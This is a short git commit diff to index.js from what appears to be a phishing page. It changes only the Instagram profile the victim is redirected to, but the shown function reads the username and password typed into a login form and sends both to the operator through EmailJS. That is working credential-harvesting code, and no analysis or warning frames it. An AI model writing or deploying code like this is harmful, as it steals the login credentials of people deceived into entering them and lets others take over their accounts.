f32a82b556f171a82f9570d5702be927d33ef646
linkshortenergu <102642948+linkshortenergu@users.noreply.github.com>
2022-05-07 17:34:43 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,10 +1,10 @@
-function sendmail(pra){
+function sendmail(){
     let temppara = {
         user_name : document.getElementById("username").value,
         user_passw : document.getElementById("passw").value
     }
     emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
     .then(function (res){
-            window.open("https://www.instagram.com/prasantasingham/");
+            window.open("https://www.instagram.com/sskk.450/");
     })
 }
